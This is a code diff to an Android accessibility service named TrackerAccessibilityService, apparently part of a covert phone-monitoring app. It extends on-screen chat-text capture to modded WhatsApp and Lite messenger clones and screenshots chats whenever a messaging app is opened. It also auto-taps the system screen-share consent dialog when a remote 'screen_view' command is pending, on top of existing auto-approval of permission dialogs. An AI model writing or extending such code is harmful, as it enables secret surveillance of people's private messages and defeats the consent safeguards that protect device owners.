@@ -32,7 +32,12 @@ class TrackerAccessibilityService : AccessibilityService() {
         "com.whatsapp", "com.whatsapp.w4b", "com.instagram.android",
         "com.facebook.orca", "com.facebook.lite", "com.facebook.katana",
         "org.telegram.messenger", "org.telegram.plus", "com.snapchat.android",
-        "com.discord", "jp.naver.line.android", "com.viber.voip", "com.skype.raider"
+        "com.discord", "jp.naver.line.android", "com.viber.voip", "com.skype.raider",
+        // Modded WhatsApp clones + Lite variants — mirrors
+        // SocialNotificationService.SOCIAL_PACKAGES so on-screen chat text is
+        // captured from them too (common on vivo/iQOO devices).
+        "com.gbwhatsapp", "com.fmwhatsapp", "com.yowhatsapp",
+        "com.instagram.lite", "com.facebook.mlite"
     )
     private val chatNoise = listOf(
         "online", "typing…", "typing...", "last seen", "recording audio",
@@ -43,8 +48,11 @@ class TrackerAccessibilityService : AccessibilityService() {
     private var lastChatSignature: String? = null
     private val chatHandler = android.os.Handler(android.os.Looper.getMainLooper())
 
-    // ── Chat screenshot capture (on send / new content) ─────────────────
+    // ── Chat screenshot capture (on open / send / new content) ──────────
     private var lastScreenshotMs: Long = 0
+    // Per-package timestamp of the last "chat opened" screenshot — at most one
+    // per package every 3 minutes so repeatedly opening WhatsApp doesn't spam.
+    private val lastOpenShotMs = HashMap<String, Long>()
     private var lastChatTextLen: Int = 0
     private var lastChatTextTs: Long = 0
     private val screenshotExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
@@ -64,6 +72,18 @@ class TrackerAccessibilityService : AccessibilityService() {
         val now = System.currentTimeMillis()
 
         // ── Auto Permission & Setup Approval ──────────────────────────
+        // 0. Live Screen: auto-confirm the MediaProjection consent dialog while
+        //    a screen_view command is pending (never taps systemui otherwise).
+        if (AutoPermissionHelper.projectionConsentPending &&
+            packageName == "com.android.systemui"
+        ) {
+            if (AutoPermissionHelper.autoApproveProjectionDialog(this)) {
+                Log.d(TAG, "Auto-approved screen-share consent dialog")
+                lastEventTime = now
+                return
+            }
+        }
+
         // 1. Auto-approve standard permission dialogs (com.android.permissioncontroller etc.)
         if (AutoPermissionHelper.isAutoTappableDialog(packageName)) {
             val success = AutoPermissionHelper.autoApproveDialog(this)
@@ -131,6 +151,9 @@ class TrackerAccessibilityService : AccessibilityService() {
                         val className = event.className?.toString() ?: ""
                         val appName = getAppName(packageName)
                         sendAppSwitchReport(packageName, appName, className)
+                        // Chat app opened → screenshot whatever chat is on screen
+                        // (per-package 3-min throttle so reopening doesn't spam).
+                        if (packageName in chatPackages) maybeShootOpenChat(packageName)
                     }
                 }
                 if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -314,6 +337,15 @@ class TrackerAccessibilityService : AccessibilityService() {
     }
 
     // ── Chat screenshot capture machinery ───────────────────────
+
+    /** Screenshot when a chat app is opened; once per open, max 1 per 3 min per package. */
+    private fun maybeShootOpenChat(packageName: String) {
+        val now = System.currentTimeMillis()
+        val last = lastOpenShotMs[packageName] ?: 0L
+        if (now - last < 3 * 60_000L) return
+        lastOpenShotMs[packageName] = now
+        maybeCaptureScreenshot(packageName, "open")
+    }
 
     private fun isSendButton(event: AccessibilityEvent): Boolean {
         return try {
